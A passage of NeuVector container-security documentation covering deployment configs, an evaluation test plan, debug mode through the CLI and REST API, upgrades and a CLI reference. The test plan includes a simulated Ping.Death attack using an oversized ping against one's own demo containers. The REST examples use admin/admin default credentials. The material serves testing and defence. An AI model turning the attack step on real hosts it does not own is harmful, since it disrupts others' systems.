for cluster communication. They must be identical for all controllers and enforcers in the cluster. Please refer to &quot;Docker-compose Details&quot; section for how to change the default ports.  Add an enforcer container using docker-compose (privileged mode)  This is an example of docker-compose file to join an enforcer into the cluster. Both greenfield and brownfield deployment are supported.  enforcer: pid: host image: neuvector/enforcer:&lt;version&gt; container_name: enforcer privileged: true environment: - CLUSTER_JOIN_ADDR=controller_node_ip ports: - 18301:18301 - 18401:18401 - 18301:18301/udp volumes: - /lib/modules:/lib/modules - /var/run/docker.sock:/var/run/docker.sock - /proc:/host/proc:ro - /sys/fs/cgroup/:/host/cgroup/:ro   The most important environment variable is CLUSTER_JOIN_ADDR. For enforcers, replace &lt;controller_node_ip&gt; with the controller's node IP address. Typically, CLUSTER_JOIN_ADDR in the controller/all-in-one's docker-compose file and enforcer's docker-compose file have the same value.  From NeuVector 4.0+, a separate scanner container must be deployed to perform vulnerability scanning.  Sample docker-compose for the Scanner:  Scanner: image: neuvector/scanner container_name: scanner environment: - SCANNER_DOCKER_URL=tcp://192.168.1.10:2376 - CLUSTER_JOIN_ADDR=controller_node_ip ports: - 18402:18402 volumes: - /var/run/docker.sock:/var/run/docker.sock:ro   ","version":"Next 🚧","tagName":"h3"},{"title":"Deployment Without Using Privileged Mode​","type":1,"pageTitle":"Mirantis Kubernetes Engine","url":"/next/special/docker#deployment-without-using-privileged-mode","content":" For some platform configurations it is possible to deploy the NeuVector containers without requiring them to run in privileged mode. The configuration must support the ability to add capabilities and set the apparmour profile. Note that Docker DataCenter/UCP and Swarm currently do not support this, but it is still possible to deploy NeuVector manually using Compose or Run.  Deploy allinone (NO privileged mode) with docker-compose  allinone: pid: host image: neuvector/allinone container_name: neuvector.allinone cap_add: - SYS_ADMIN - NET_ADMIN - SYS_PTRACE - IPC_LOCK security_opt: - apparmor=unconfined - seccomp=unconfined - label=disable environment: - CLUSTER_JOIN_ADDR=[AllInOne Node IP Address] ports: - 18300:18300 - 18301:18301 - 18400:18400 - 18401:18401 - 18301:18301/udp - 9443:8443 volumes: - /lib/modules:/lib/modules - /var/run/docker.sock:/var/run/docker.sock - /proc:/host/proc:ro - /sys/fs/cgroup:/host/cgroup:ro - /var/neuvector:/var/neuvector   Deploy enforcer (NO privileged mode) with docker-compose  enforcer: pid: host image: neuvector/enforcer container_name: neuvector.enforcer cap_add: - SYS_ADMIN - NET_ADMIN - SYS_PTRACE - IPC_LOCK security_opt: - apparmor=unconfined - seccomp=unconfined - label=disable environment: - CLUSTER_JOIN_ADDR=[AllInOne Node IP Address] ports: - 18301:18301 - 18401:18401 - 18301:18301/udp volumes: - /lib/modules:/lib/modules - /var/run/docker.sock:/var/run/docker.sock - /proc:/host/proc:ro - /sys/fs/cgroup/:/host/cgroup/:ro  ","version":"Next 🚧","tagName":"h3"},{"title":"Troubleshooting NeuVector Deployments","type":0,"sectionRef":"#","url":"/next/troubleshooting","content":"Troubleshooting NeuVector Deployments How to troubleshoot NeuVector Deployments and collect logs for support.","keywords":"","version":"Next 🚧"},{"title":"Evaluating and Testing NeuVector","type":0,"sectionRef":"#","url":"/next/testing/testing","content":"","keywords":"","version":"Next 🚧"},{"title":"Sample Applications​","type":1,"pageTitle":"Evaluating and Testing NeuVector","url":"/next/testing/testing#sample-applications","content":" After you’ve deployed the NeuVector components you can evaluate it using the sample test applications we provide. These are located in the ’nvbeta’ repository on docker hub.  A typical Kubernetes-based test environment would have a master node and two to three worker nodes. You can control if application pods and NeuVector containers are deployed on a master node (off by default).  ","version":"Next 🚧","tagName":"h3"},{"title":"Kubernetes Test Plan​","type":1,"pageTitle":"Evaluating and Testing NeuVector","url":"/next/testing/testing#kubernetes-test-plan","content":" To deploy a multi-tier application using Nginx, Nodejs, and Redis, use the samples below (in the order below). These may need to be edited for deployment on OpenShift, Rancher and other Kubernetes based tools.  Create a demo namespace  kubectl create namespace demo   note The sample below use apiVersion: apps/v1 required by Kubernetes 1.16+.  Create the Redis service and deployment using this yaml:  apiVersion: v1 kind: Service metadata: name: redis namespace: demo spec: ports: - port: 6379 protocol: &quot;TCP&quot; name: &quot;cluster-tcp-6379&quot; clusterIP: None selector: app: redis-pod --- apiVersion: apps/v1 kind: Deployment metadata: name: redis-pod namespace: demo spec: selector: matchLabels: app: redis-pod template: metadata: labels: app: redis-pod spec: containers: - name: redis-pod image: redis   Create the Nodejs service and deployment using this yaml:  apiVersion: v1 kind: Service metadata: name: node namespace: demo spec: ports: - port: 8888 protocol: &quot;TCP&quot; name: &quot;cluster-tcp-8888&quot; clusterIP: None selector: app: node-pod --- apiVersion: apps/v1 kind: Deployment metadata: name: node-pod namespace: demo spec: selector: matchLabels: app: node-pod replicas: 3 template: metadata: labels: app: node-pod spec: containers: - name: node-pod image: nvbeta/node   Create the Nginx service and deployment using this yaml:  apiVersion: v1 kind: Service metadata: name: nginx-webui namespace: demo spec: ports: - port: 80 name: webui protocol: TCP type: NodePort selector: app: nginx-pod --- apiVersion: apps/v1 kind: Deployment metadata: name: nginx-pod namespace: demo spec: selector: matchLabels: app: nginx-pod template: metadata: labels: app: nginx-pod spec: containers: - name: nginx-pod image: nvbeta/swarm_nginx ports: - containerPort: 80 protocol: TCP   To access the Nginx-webui service externally, find the random port assigned to it (mapped to port 80) by the NodePort:  kubectl get svc -n demo   Then connect to the public IP address/port for one of the kubernetes nodes, e.g. ‘http://(public_IP):(NodePort)’  After deploying NeuVector, you can run test traffic through the demo applications to generate the whitelist rules, and then move all services to Monitor or Protect mode to see violations and attacks.  Generating Network Violations on Kubernetes​  To generate a violation from a nodejs pod, find a pod:  kubectl get pod -n demo   Then try some violations (replace node-pod-name):  kubectl exec node-pod-name curl www.google.com -n demo   Or find the internal IP address of another node pod, like 172.30.2.21 in the example below, to connect from one node to another:  kubectl exec node-pod-name curl 172.30.2.21:8888 -n demo   Generate a Threat/Attack​  To simulate an attack, log into a container, then try a ping attack:  kubectl exec -it node-pod-name bash -n demo   Use the internal IP of another node pod:  ping 172.30.2.21 -s 40000   For all of the above, you can view the security events in the NeuVector console Network Activity map, as well as the Notifications tab.  Process and File Protection Tests​  Try various process and file activity by exec'ing into a container and running commands such as apt-get update, ssh, scp or others. Any process activity or file access not allowed will generate alerts in Notifications.  Registry Scanning and Admission Control​  A popular test is to configure image scanning of a registry in Assets -&gt; Registries. After the scan is complete, configure an Admission Control rule in Policy. Be sure to enable Admission Controls and set a rule to Deny when there are high vulnerabilities in an image. Then pick an image that has high vulnerabilities and try to deploy it in Kubernetes. The deployment will be blocked in Protect mode and you will see an event in Notifications -&gt; Security Risks.  More advanced admission control testing can be done using different criteria in rules, or combining criteria.  Deploy Another App​  The Kubernetes Guestbook demo application can also be deployed on Kubernetes. It is recommended to deploy it into its own namespace so you can see namespace based filtering in the NeuVector console.  ","version":"Next 🚧","tagName":"h3"},{"title":"Docker-native Test Plan​","type":1,"pageTitle":"Evaluating and Testing NeuVector","url":"/next/testing/testing#docker-native-test-plan","content":" After deploying the NeuVector components and the sample application(s) you’ll be able to Discover, Monitor and Protect running containers. The test plan below provides suggestions for generating run-time violations of allowed application behavior and scanning containers for vulnerabilities.  NeuVector Test Plan  If the link above does not work, you can download it from our website using password nv1851blvd.  NeuVector can also detect threats to your containers such as DDOS attacks. If you run a tool to generate such attacks on your containers, these results will show in Network Activity and in the Dashboard.  For example, a simple ping command with high payload will show the Ping.Death attack in the console. To try this, do the following to the IP address of one of the containers (internal IP of the container).  ping &lt;container_ip&gt; -s 40000   In Kubernetes you can do this from any node including the master. In other environments you may need to be logged into the node where the container is running. ","version":"Next 🚧","tagName":"h3"},{"title":"Update the NeuVector Containers","type":0,"sectionRef":"#","url":"/next/updating","content":"Update the NeuVector Containers How to update the NeuVector components","keywords":"","version":"Next 🚧"},{"title":"Troubleshooting","type":0,"sectionRef":"#","url":"/next/troubleshooting/troubleshooting","content":"","keywords":"","version":"Next 🚧"},{"title":"Troubleshooting NeuVector Deployments​","type":1,"pageTitle":"Troubleshooting","url":"/next/troubleshooting/troubleshooting#troubleshooting-neuvector-deployments","content":" The NeuVector containers are deployed, managed, and updated using the same orchestration tool used for application workloads. Please be sure to review the online documentation for each step necessary during deployment. Often deployments are attempted by just copying the sample yaml files and deploying them without reviewing the steps prior, such as properly configuring registries, secrets, or RBACs/rolebindings.  Initial Deployment​  Check that the NeuVector containers can be pulled with correct authentication. Check the secret used and make sure the cluster is able to access the appropriate registry.Make sure the changes to the yaml required (e.g. NodePort or LoadBalancer) or Helm values settings are set appropriately.Check the platform and container run-time and make changes as needed (e.g. PKS, containerd, CRI-O).  Login and Initial Configuration​  Check to make sure appropriate access to the manager (IP address, port, route) is allowed through firewalls.  Ongoing Operation​  Directory integration. NeuVector supports specific configurations for LDAP/AD and other integrations for groups and roles. Contact NeuVector for additional troubleshooting steps and a tool for AD troubleshooting.Registry scanning. Most issues are related to registry authentication errors or inability for the controller to access the registry from the cluster.For performance issues, make sure the scanner is allocated enough memory for scanning large images. Also, CPU and memory minimums can be specified in the pod policy to ensure adequate performance at scale.Admission Control. See the Troubleshooting section in the section Security Risks... -&gt; Admission Controls.  Updating​  Use rolling updates for the controller. If you are rebooting hosts, make sure to monitor the controllers as they move to other hosts, or redeploy on the rebooted hosts, to make sure they are able to start, join the controller cluster, and stabilize/sync. Rebooting all hosts at once or too quickly can result in unknown states for the controllers.Use a persistent volume claim to store the NeuVector configuration for the case that all controllers/nodes go down in the cluster.When updating to a new version, review the online documentation to identify changes/additions to the yaml required, as well as other changes such as rolebindings or new services (e.g. admission control webhook, persistent volume claim etc).  ","version":"Next 🚧","tagName":"h3"},{"title":"Debug Logs​","type":1,"pageTitle":"Troubleshooting","url":"/next/troubleshooting/troubleshooting#debug-logs","content":" To view the logs of a NeuVector container, for example a controller pod  kubectl logs neuvector-controller-pod-777fdc5668-4jkjn -n neuvector   These logs may show cluster connectivity issues, admin actions, scanning activity and other useful entries. If there are multiple controllers running it may be necessary to inspect each one. These logs can be piped to a file to send to NeuVector support.  Turning on Debug mode for NeuVector Controllers​  For issues that require in-depth investigation, debug mode can be enabled for the controllers/allinones, which will log detailed information. This can increase the log file size by a large amount, so it is recommended to turn it off after collecting them.  Kubernetes, OpenShift and Other Orchestration Logs​  It can be helpful to inspect the logs from orchestration tools to see all deployment activity including pod creation timestamps and status, deployments, daemonsets and other management actions of the NeuVector containers performed by the orchestration tool.  kubectl get events -n neuvector   ","version":"Next 🚧","tagName":"h3"},{"title":"Support Log​","type":1,"pageTitle":"Troubleshooting","url":"/next/troubleshooting/troubleshooting#support-log","content":" The support log contains additional information which is useful for NeuVector Support, including system configuration, containers, policies, notifications, and NeuVector container details.  To download the support log, go to Settings -&gt; Configuration and select Collect Log.  ","version":"Next 🚧","tagName":"h3"},{"title":"Using the CLI to turn on Debug Mode​","type":1,"pageTitle":"Troubleshooting","url":"/next/troubleshooting/troubleshooting#using-the-cli-to-turn-on-debug-mode","content":" Login to NeuVector manager pod with user and password (recommended in a separate terminal window).  kubectl exec -it neuvector-manager-pod-5bb76b6754-rlmnp -n neuvector -- cli   #neuvector-svc-controller.neuvector&gt; login   Get the list of controllers. Find the controller with the Leader = True.  show controller   Turn on the debug mode in the leader controller using the ID or name of controller  set controller 4fce427cf963 debug -c all   To turn on debug mode on all controllers  set system controller_debug -c all   Perform the activity in NeuVector which you wish to debug. Then view the controller logs (in a separate terminal window).  kubectl logs &lt;leader_controller_pod_name&gt; -n neuvector   If required, capture the logs and send them to NeuVector.  Turn off Debug mode on the controller (back in the CLI window).  set controller 4fce427cf963 debug exit   Check controller debug status.  show controller setting 289d67396fcb   ","version":"Next 🚧","tagName":"h3"},{"title":"Using the REST API to turn on Debug Mode​","type":1,"pageTitle":"Troubleshooting","url":"/next/troubleshooting/troubleshooting#using-the-rest-api-to-turn-on-debug-mode","content":" Set access token with your IP, user, password:  _controllerIP_=&quot;&lt;your_controller_ip&gt;&quot; _controllerRESTAPIPort_=&quot;10443&quot; _neuvectorUsername_=&quot;admin&quot; _neuvectorPassword_=&quot;admin&quot;   note For Kubernetes based deployments you can get the Controller IP in the following command output:  kubectl get pod -n neuvector -o wide | grep controller   note If accessing the REST API from outside the cluster, see the Automation section instructions.  Get the authentication token  curl -k -H &quot;Content-Type: application/json&quot; -d '{&quot;password&quot;: {&quot;username&quot;: &quot;'$_neuvectorUsername_'&quot;, &quot;password&quot;: &quot;'$_neuvectorPassword_'&quot;}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/auth&quot; &gt; /dev/null 2&gt;&amp;1 &gt; token.json _TOKEN_=`cat token.json | jq -r '.token.token'`   note You may need to install jq ($sudo yum install jq)  Enable Debug Mode  curl -X PATCH -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;config&quot;: {&quot;controller_debug&quot;: [&quot;cpath&quot;, &quot;conn&quot;]}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/system/config&quot; &gt; /dev/null 2&gt;&amp;1 &gt; set_debug.json #debug options - cpath, conn, mutex, scan, cluster , all   Disable Debug on all controllers in a cluster  curl -X PATCH -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;config&quot;: {&quot;controller_debug&quot;: []}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/system/config&quot; &gt; /dev/null 2&gt;&amp;1 &gt; set_debug.json   Check the controller debug status in a cluster  curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/system/config&quot; &gt; /dev/null 2&gt;&amp;1 &gt; system_setting.json cat system_setting.json | jq .config.controller_debug   Logout  echo `date +%Y%m%d_%H%M%S` log out curl -k -X 'DELETE' -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/auth&quot; &gt; /dev/null 2&gt;&amp;1  ","version":"Next 🚧","tagName":"h3"},{"title":"Automating NeuVector","type":0,"sectionRef":"#","url":"/automation","content":"Automating NeuVector NeuVector can be integrated into the CI/CD workflow to provide automated scanning and deployment. We provide examples of using the REST API to automate NeuVector deployment.","keywords":"","version":"5.3"},{"title":"Updating NeuVector","type":0,"sectionRef":"#","url":"/next/updating/updating","content":"","keywords":"","version":"Next 🚧"},{"title":"Updating NeuVector Components​","type":1,"pageTitle":"Updating NeuVector","url":"/next/updating/updating#updating-neuvector-components","content":" It’s super easy to update your NeuVector containers. If there is a new release available, pull it from Docker Hub. It is recommended to use a ‘rolling update’ strategy to keep at least one Allinone or Controller container running at any time during an update.  imporant Host OS updates, reboots, and orchestrator updates can cause pods to be evicted or stopped. If a Controller is affected, and there are no other Controllers active to maintain the state, the Controllers can become available for some time while new controllers are started, a cluster is formed with a leader, and the persistent storage backup of the configuration is attempted to be accessed to restore the cluster. Be careful when scheduling host or orchestrator updates and reboots which may affect the number of controllers available at any time. See the Pod Disruption Budget below for possible ways to mitigate this. If deployment was done using the NeuVector Helm charts, updating will take care of additional services, rolebindings or other upgrade requirements. If updates are done manually or there is only one Allinone or Controller running, please note that current network connection data is NOT stored and will be lost when the NeuVector container is stopped. NeuVector supports persistent data for the NeuVector policy and configuration. This configures a real-time backup to mount a volume at /var/neuvector/. The primary use case is when the persistent volume is mounted, the configuration and policy are stored during run-time to the persistent volume. In the case of total failure of the cluster, the configuration is automatically restored when the new cluster is created. Configuration and policy can also be manually restored or removed from the /var/neuvector/ volume.  important If a persistent volume is not mounted, NeuVector does NOT store the configuration or policy as persistent data. Be sure to backup the Controller configuration and policy before stopping the allinone or controller container. This can be done in Settings -&gt; Configuration. Alternatively, the controller can be deployed in an HA configuration with 3 or 5 controllers running, in which case the policy will persist with other controllers while one is being updated.  To manually update NeuVector using docker-compose:  sudo docker-compose -f &lt;filename&gt; down   Note that if no filename is specified then the docker-compose.yml file is used.  Make sure the docker-compose.yml or other appropriate file is edited with the desired image version, if necessary, then:  $sudo docker-compose -f &lt;filename&gt; up -d   note We recommend that all NeuVector components be updated to the most recent version at the same time. Backward compatibility is supported for at least one minor version back. Although most older versions will be backward compatible, there may be exceptions which cause unexpected behavior.  ","version":"Next 🚧","tagName":"h3"},{"title":"Rolling Updates​","type":1,"pageTitle":"Updating NeuVector","url":"/next/updating/updating#rolling-updates","content":" Orchestration tools such as Kubernetes, RedHat OpenShift, and Rancher support rolling updates with configurable policies. You can use this feature to update the NeuVector containers. The most important will be to ensure that there is at least one Allinone/Controller running so that policies, logs, and connection data is not lost. Make sure that there is a minimum of 30 seconds between container updates so that a new leader can be elected and the data synchronized between controllers.  Sample Kubernetes Rolling Update​  If your Deployment or Daemonset is already running, you can change the yaml file to the new version, then apply the update:  kubectl apply -f &lt;yaml file&gt;   To update to a new version of NeuVector from the command line.  kubectl set image deployment/neuvector-controller-pod neuvector-controller-pod=neuvector/controller:4.2.2 -n neuvector kubectl set image deployment/neuvector-manager-pod neuvector-manager-pod=neuvector/manager:4.2.2 -n neuvector kubectl set image DaemonSet/neuvector-enforcer-pod neuvector-enforcer-pod=neuvector/enforcer:4.2.2 -n neuvector   To check the status of the rolling update:  kubectl rollout status -n neuvector ds/neuvector-enforcer-pod kubectl rollout status -n neuvector deployment/neuvector-controller-pod # same for manager, scanner etc   To rollback the update:  kubectl rollout undo -n neuvector ds/neuvector-enforcer-pod kubectl rollout undo -n neuvector deployment/neuvector-controller-pod # same for manager, scanner etc   ","version":"Next 🚧","tagName":"h3"},{"title":"Updating the Vulnerability CVE Database​","type":1,"pageTitle":"Updating NeuVector","url":"/next/updating/updating#updating-the-vulnerability-cve-database","content":" The NeuVector Scanner image is regularly updated on neuvector with new CVE database updates, using the 'latest' tag.  The default NeuVector deployment includes deployment of scanner pods as well as an Updater cron job to update the scanners every day.  Please see the section Updating the CVE Database for more details.  The CVE database version can be seen in the Console in the Vulnerabilities tab. You can also inspect the Updater container image. The latest database version number can also be found listed here.  docker inspect neuvector/updater   &quot;Labels&quot;: { &quot;neuvector.image&quot;: &quot;neuvector/updater&quot;, &quot;neuvector.role&quot;: &quot;updater&quot;, &quot;neuvector.vuln_db&quot;: &quot;1.255&quot; }   You can also inspect the controller/allinone logs for 'version.' For example in Kubernetes:  kubectl logs neuvector-controller-pod-777fdc5668-4jkjn -n neuvector | grep version   2019-07-29T17:04:02.43 |DEBU|SCN|main.dbUpdate: New DB found - create=2019-07-24T11:59:13Z version=1.576 2019-07-29T17:04:02.454|DEBU|SCN|memdb.ReadCveDb: New DB found - update=2019-07-24T11:59:13Z version=1.576 2019-07-29T17:04:12.224|DEBU|SCN|main.scannerRegister: - version=1.576   ","version":"Next 🚧","tagName":"h3"},{"title":"Pod Disruption Budget​","type":1,"pageTitle":"Updating NeuVector","url":"/next/updating/updating#pod-disruption-budget","content":" A Kubernetes feature allows for ensuring that a minimum number of controllers are running at any time. This is useful for node draining or other maintenance activities that could remove controller pods. For example, create and apply the file below nv_pdb.yaml to ensure that there are at least 2 controllers running at any time.  apiVersion: policy/v1beta1 kind: PodDisruptionBudget metadata: name: neuvector-controller-pdb namespace: neuvector spec: minAvailable: 2 selector: matchLabels: app: neuvector-controller-pod   ","version":"Next 🚧","tagName":"h3"},{"title":"Upgrading from NeuVector 4.x to 5.1.x​","type":1,"pageTitle":"Updating NeuVector","url":"/next/updating/updating#upgrading-from-neuvector-4x-to-51x","content":" Upgrade first to a 5.1.x release such as 5.1.3, then see the Kubernetes deployment section for updating to 5.2.x+ for important changes to services accounts and bindings.  For Helm users, update to NeuVector Helm chart 2.0.0 or later (prior to NeuVector 5.2.0). If updating an Operator or Helm install on OpenShift, see note below.  Delete old neuvector-binding-customresourcedefinition clusterrole  kubectl delete clusterrole neuvector-binding-customresourcedefinition   Apply new update verb for neuvector-binding-customresourcedefinition clusterrole  kubectl create clusterrole neuvector-binding-customresourcedefinition --verb=watch,create,get,update --resource=customresourcedefinitions   Delete old crd schema for Kubernetes 1.19+  kubectl delete -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/crd-k8s-1.19.yaml   Create new crd schema for Kubernetes 1.19+  kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.0.0/crd-k8s-1.19.yaml kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.0.0/waf-crd-k8s-1.19.yaml kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.0.0/dlp-crd-k8s-1.19.yaml kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.0.0/admission-crd-k8s-1.19.yaml   Create a new DLP, WAP, Admission clusterrole and clusterrolebinding  kubectl create clusterrole neuvector-binding-nvwafsecurityrules --verb=list,delete --resource=nvwafsecurityrules kubectl create clusterrolebinding neuvector-binding-nvwafsecurityrules --clusterrole=neuvector-binding-nvwafsecurityrules --serviceaccount=neuvector:default kubectl create clusterrole neuvector-binding-nvadmissioncontrolsecurityrules --verb=list,delete --resource=nvadmissioncontrolsecurityrules kubectl create clusterrolebinding neuvector-binding-nvadmissioncontrolsecurityrules --clusterrole=neuvector-binding-nvadmissioncontrolsecurityrules --serviceaccount=neuvector:default kubectl create clusterrole neuvector-binding-nvdlpsecurityrules --verb=list,delete --resource=nvdlpsecurityrules kubectl create clusterrolebinding neuvector-binding-nvdlpsecurityrules --clusterrole=neuvector-binding-nvdlpsecurityrules --serviceaccount=neuvector:default   Update image names and paths for pulling NeuVector images from Docker hub (docker.io). The images are on the NeuVector Docker Hub registry. Use the appropriate version tag for the manager, controller, enforcer, and leave the version as 'latest' for scanner and updater. For example:  neuvector/manager:5.1.3neuvector/controller:5.1.3neuvector/enforcer:5.1.3neuvector/scanner:latestneuvector/updater:latest  Optionally, remove any references to the NeuVector license and secrets in Helm charts, deployment yaml, configmap, scripts etc, as these are no longer required to pull the images or to start using NeuVector.  Note about SCC and Upgrading via Operator/Helm  Privileged SCC is added to the Service Account specified in the deployment yaml by Operator version 1.3.4 and above in new deployments. In the case of upgrading the NeuVector Operator from a previous version to 1.3.4 or Helm to 2.0.0, please delete Privileged SCC before upgrading.  oc delete rolebinding -n neuvector system:openshift:scc:privileged  ","version":"Next 🚧","tagName":"h3"},{"title":"NeuVector Workflow","type":0,"sectionRef":"#","url":"/automation/ci_workflow","content":"","keywords":"","version":"5.3"},{"title":"NeuVector Integration into CI/CD Workflow​","type":1,"pageTitle":"NeuVector Workflow","url":"/automation/ci_workflow#neuvector-integration-into-cicd-workflow","content":" NeuVector supports the entire CI/CD process and can be easily integrated into the workflow to provide security throughout the development and deployment process.  Dev and Continuous Integration Workflow​  NeuVector can be integrated into the Dev and CI processes to automate vulnerability scanning. The use of the NeuVector Jenkins plug-in and Registry scanning functions enable image scanning during this phase.    In addition, NeuVector can be used during automated application testing to analyze network connections and container behavior to anticipate any issues in staging or production.  Continuous Deployment and Production Workflow​  NeuVector can conduct pre-deployment compliance testing and security auditing prior to production as well as in production.    The multi-vector security platform is able to combine network security, container inspections, and host security to protect containers at run-time. ","version":"5.3","tagName":"h3"},{"title":"Command Line","type":0,"sectionRef":"#","url":"/next/tronubleshooting/cli","content":"","keywords":"","version":"Next 🚧"},{"title":"Using the NeuVector Command Line​","type":1,"pageTitle":"Command Line","url":"/next/tronubleshooting/cli#using-the-neuvector-command-line","content":" The NeuVector solution supports a limited set of functions using the CLI. The CLI is supported through the Manager, which in turn uses a RestAPI to issue commands to the Controller. The Controller then manages the Enforcer(s) appropriately. A complete set of operations is supported through the REST API, which can be exposed directly from the Controller. You can access the NeuVector CLI by typing the cli command for the Manager or Allinone, for example:  kubectl exec -it neuvector-manager-pod-5bb76b6754-rlmnp -n neuvector -- cli   docker exec -it allinone cli   Where ‘allinone’ is the container name for the Controller. You may need to use the container ID for the name.  Although the CLI is available through the Manager, we recommend using the REST API directly into the controller for querying and automation.  CLI Command Examples​  Here are some of the most common CLI commands:  &gt; login &gt; logout   Use the same user/password you use for the console.  &gt; show policy -h Usage: cli show policy [OPTIONS] COMMAND [ARGS]...   &gt; create policy rule -h Usage: cli create policy rule [OPTIONS] FROM TO &gt; delete policy rule -h Usage: cli delete policy rule [OPTIONS] ID   &gt; show log -h Usage: cli show log [OPTIONS] COMMAND [ARGS]...   &gt; set system policy_mode -h Usage: cli set system policy_mode [OPTIONS] MODE Set system policy mode. Options: -h, --help Show this message and exit. MODES: learn=discover evaluate=monitor enforce=protect   &gt; set controller &lt;leader_controller_id&gt; debug -c cpath Turn on debug mode.   &gt; set controller &lt;leader_controller_id&gt; debug Turn off debug mdoe.   More CLI commands are listed below.  ","version":"Next 🚧","tagName":"h3"},{"title":"Command Line Reference & Commands​","type":1,"pageTitle":"Command Line","url":"/next/tronubleshooting/cli#command-line-reference--commands","content":" ","version":"Next 🚧","tagName":"h2"},{"title":"Login/Logout​","type":1,"pageTitle":"Command Line","url":"/next/tronubleshooting/cli#loginlogout","content":" &gt; login -h Usage: cli login [OPTIONS] Login and obtain an authentication token. Options: --username TEXT --password TEXT -h, --help Show this message and exit.   &gt; logout -h Usage: cli logout [OPTIONS] Clear local authentication credentials. Options: -h, --help Show this message and exit.   &gt; exit -h Usage: cli exit [OPTIONS] Exit CLI. Options: -h, --help Show this message and exit.   ","version":"Next 🚧","tagName":"h3"},{"title":"User​","type":1,"pageTitle":"Command Line","url":"/next/tronubleshooting/cli#user","content":" &gt; create user -h Usage: cli create user [OPTIONS] USERNAME ROLE Create user. Options: --email TEXT --locale TEXT --password TEXT --password2 TEXT -h, --help Show this message and exit.   &gt; set user -h Usage: cli set user [OPTIONS] USERNAME COMMAND [ARGS]... Set user configuration. Options: -h, --help Show this message and exit. Commands: local Set local user. remote Set remote user.   &gt; unset user -h Usage: cli unset user [OPTIONS] USERNAME COMMAND [ARGS]... Unset user configuration. Options: -h, --help Show this message and exit. Commands: local Unset local user. remote Unset remote user.   &gt; delete user -h Usage: cli delete user [OPTIONS] USERNAME Delete user. Options: -h, --help Show this message and exit.   ","version":"Next 🚧","tagName":"h3"},{"title":"Policy​","type":1,"pageTitle":"Command Line","url":"/next/tronubleshooting/cli#policy","content":" &gt; create group -h Usage: cli create group [OPTIONS] NAME Create group. For --lable, use format: key,value. If the option value starts with @, the criterion matches string with substring 'value'. Options: --image TEXT container image name. --node TEXT node name. --container TEXT container workload name. --application TEXT container application name. --label TEXT container label. -h, --help Show this message and exit.   &gt; set group -h Usage: cli set group [OPTIONS] NAME Set group configuration. For --lable, use format: key,value. If the option value starts with @, the criterion matches string with substring 'value'. Options: --image TEXT container image name. --node TEXT node name. --container TEXT container workload name. --application TEXT container application name. --label TEXT container label. -h, --help Show this message and exit.   &gt; delete group -h Usage: cli delete group [OPTIONS] NAME Delete group. Options: -h, --help Show this message and exit.   &gt; create policy rule -h Usage: cli create policy rule [OPTIONS] FROM TO Create and append policy rule, with unique rule id (&lt; 10000). Options: --id INTEGER Policy rule ID. (Optional) --ports TEXT Port list. eg: any or 80,8080,8500-8508,tcp/443,tcp/3306-3307,udp/53 --applications TEXT Application list. eg: http,kafka --action [allow|deny] --after INTEGER Specify policy rule ID that the new rule is inserted after. Use 0 to insert to the first. --comment TEXT -h, --help Show this message and exit.   &gt; set policy rule -h Usage: cli set policy rule [OPTIONS] ID Configure policy rule. Options: --from TEXT --to TEXT --ports TEXT Port list. eg: any or 80,8080,8500-8508,tcp/443,tcp/3306-3307,udp/53 --applications TEXT Application list. eg: http,kafka --action [allow|deny] --after INTEGER Specify policy rule ID that the new rule is inserted after. Use 0 to insert to the first. --comment TEXT -h, --help Show this message and exit.   &gt; delete policy rule -h Usage: cli delete policy rule [OPTIONS] ID Delete policy rule. Options: -h, --help Show this message and exit.   &gt; show service -h Usage: cli show service [OPTIONS] COMMAND [ARGS]... Show service Options: --sort TEXT sort field. --sort_dir [asc|desc] sort direction. -h, --help Show this message and exit. Commands: detail Show service detail.   &gt; set service -h Usage: cli set service [OPTIONS] NAME COMMAND [ARGS]... Set service configuration. Options: -h, --help Show this message and exit. Commands: policy_mode Set service policy mode [discover, monitor, protect]   &gt; set system new_service policy_mode -h SEE System (below)   ","version":"Next 🚧","tagName":"h3"},{"title":"Quarantine​","type":1,"pageTitle":"Command Line","url":"/next/tronubleshooting/cli#quarantine","content":" &gt; set container Usage: cli set container [OPTIONS] ID_OR_NAME COMMAND [ARGS]... Set container configuration. Options: -h, --help Show this message and exit. Commands: quarantine Set container quarantine state.   ","version":"Next 🚧","tagName":"h3"},{"title":"System​","type":1,"pageTitle":"Command Line","url":"/next/tronubleshooting/cli#system","content":" &gt; set system -h Usage: cli set system [OPTIONS] COMMAND [ARGS]... Set system configuration. Options: -h, --help Show this message and exit. Commands: new_service policy_mode Set system policy mode. syslog Set syslog server IP and port (1.2.3.4:514)   &gt; set system syslog -h Usage: cli set system syslog [OPTIONS] COMMAND [ARGS]... Set syslog settings Options: -h, --help Show this message and exit. Commands: category syslog categories... level Set syslog level server Set syslog server IP and port (1.2.3.4:514) status Enable/disable syslog   &gt; set system new_service policy_mode -h Usage: cli set system new_service policy_mode [OPTIONS] MODE Set system new service policy mode. Options: -h, --help Show this message and exit. MODES: discover monitor protect   &gt; unset system Usage: cli unset system [OPTIONS] COMMAND [ARGS]... Unset system configuration. Options: -h, --help Show this message and exit. Commands: syslog_server Unset syslog server address.   ","version":"Next 🚧","tagName":"h3"},{"title":"Vulnerability Scan​","type":1,"pageTitle":"Command Line","url":"/next/tronubleshooting/cli#vulnerability-scan","content":" &gt; set scan auto -h Usage: cli set scan auto [OPTIONS] AUTO Set scanner mode. Options: -h, --help Show this message and exit. AUTO: enable disable   &gt; request scan container -h Usage: cli request scan container [OPTIONS] ID_OR_NAME Request to scan one 